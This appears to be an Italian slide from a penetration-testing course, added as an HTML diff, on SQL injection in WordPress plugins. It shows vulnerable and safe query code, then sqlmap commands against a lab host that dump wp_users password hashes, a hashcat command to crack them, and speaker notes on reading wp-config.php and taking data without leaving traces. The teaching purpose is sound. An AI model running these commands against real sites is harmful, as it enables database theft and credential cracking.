@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Capitolo 4: Exploitation - SQL Injection</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Capitolo 4: Exploitation</h1>
+        <div class="subtitle">Slide 4.7: SQL Injection in WordPress</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Teoria: SQLi nei Plugin</div>
+                <div class="card-text">
+                    <p>Il core di WordPress è relativamente sicuro contro SQLi grazie a <code class="tech-term">$wpdb->prepare()</code>. Ma i plugin spesso non lo usano correttamente.</p>
+                    <br>
+                    <p><strong>Pattern vulnerabili comuni:</strong></p>
+                    <div class="code-box"><span class="text-red">// VULNERABILE - concatenazione diretta</span>
+$query = "SELECT * FROM users WHERE id=" . $_GET['id'];
+
+<span class="text-green">// SICURO - prepared statement</span>
+$wpdb->prepare("SELECT * FROM users WHERE id=%d", $_GET['id']);</div>
+                    <br>
+                    <p><strong>Obiettivi SQLi in WordPress:</strong></p>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li>Dump tabella <code>wp_users</code> (hash password)</li>
+                        <li>Lettura <code>wp_options</code> (config, API keys)</li>
+                        <li>Modifica dati (privilege escalation)</li>
+                        <li>File read/write (se permissions OK)</li>
+                    </ul>
+                    <br>
+                    <p class="security-insight"><strong>Security Insight:</strong> Gli hash WordPress usano PHPass. Sono crackabili con hashcat ma richiedono tempo. Preferite altri vettori se disponibili.</p>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">Lab: SQLMap Automatico</div>
+                <div class="card-text">
+                    <p><strong>Identificare endpoint vulnerabile:</strong></p>
+                    <div class="code-box"># Parametro sospetto in un plugin
+http://vulnerable-wp.local/wp-admin/admin.php?page=plugin&id=1</div>
+                    <br>
+                    <p><strong>Lanciare SQLMap:</strong></p>
+                    <div class="code-box"><span class="text-yellow">┌──(kali㉿kali)-[~]</span>
+<span class="text-red">└─$</span> sqlmap -u "http://vulnerable-wp.local/wp-admin/admin.php?page=plugin&id=1" --cookie="wordpress_logged_in=..." --dbs</div>
+                    <br>
+                    <p><strong>Dump tabella utenti:</strong></p>
+                    <div class="code-box"><span class="text-red">└─$</span> sqlmap -u "..." -D wordpress -T wp_users --dump
+
++----+------------+------------------------------------+
+| ID | user_login | user_pass                          |
++----+------------+------------------------------------+
+| 1  | admin      | $P$B7.../... (PHPass hash)        |
+| 2  | editor     | $P$B9.../...                       |
++----+------------+------------------------------------+</div>
+                    <br>
+                    <p><strong>Crack con Hashcat:</strong></p>
+                    <div class="code-box"><span class="text-red">└─$</span> hashcat -m 400 hashes.txt rockyou.txt</div>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+
+    <!-- 
+        SPEAKER NOTES:
+        "SQLi è ancora comune nei plugin. A sinistra, il problema: i plugin non usano $wpdb->prepare().
+        A destra, SQLMap automatizza tutto. Il flag --cookie è importante se l'endpoint richiede autenticazione.
+        --dbs elenca i database, poi -D e -T per selezionare quello che ci interessa.
+        Il dump di wp_users ci dà gli hash delle password. Sono in formato PHPass (-m 400 in hashcat).
+        NOTA: Se avete già RCE, non serve fare SQLi! Potete leggere wp-config.php e connettervi direttamente al DB.
+        SQLi è utile quando RCE non è disponibile o volete solo i dati senza lasciare file sul server."
+    -->
+
+    <script>const slideNumero = 30;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
